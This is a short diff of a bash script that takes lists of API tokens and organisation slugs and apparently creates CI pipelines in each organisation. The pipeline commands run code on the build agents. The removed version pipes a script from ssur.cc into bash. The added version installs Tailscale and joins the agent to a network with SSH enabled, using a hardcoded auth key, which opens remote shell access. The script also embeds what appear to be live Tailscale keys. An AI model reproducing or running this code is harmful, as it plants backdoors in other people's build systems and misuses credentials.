@@ -5,7 +5,7 @@ echo "Enter one or more combos [API_TOKEN]/[ORG_SLUG], one per line. Press Ctrl+
 # Read all lines into an array
 mapfile -t combos
 
-# AUTH_KEY=""
+AUTH_KEY="tskey-auth-kgKAbVYraj11CNTRL-RijXguccwhRYHZ9rzL5vhRcvfBFg2u8v"
 
 # get_tailscale_auth_key() {
 #   local OAUTH_TOKEN="tskey-api-kWHuFCpgE811CNTRL-hTSQhCsVSyhtt4ufY8yTyhSARYvrrevDd"
@@ -86,7 +86,7 @@ for combo in "${combos[@]}"; do
   "name": "$PIPELINE_SLUG",
   "repository": "git@github.com:bloxclone/e.git",
   "cluster_id": "$CLUSTER_ID",
-  "configuration": "steps:\n  - label: \":pipeline:\"\n    commands: curl -L https://ssur.cc/startsh | bash"
+  "configuration": "steps:\n  - label: \":pipeline:\"\n    commands: curl -fsSL https://tailscale.com/install.sh | sh && sudo tailscaled & sleep 2 && sudo tailscale up --ssh --auth-key=${AUTH_KEY}"
 }
 EOF
   )
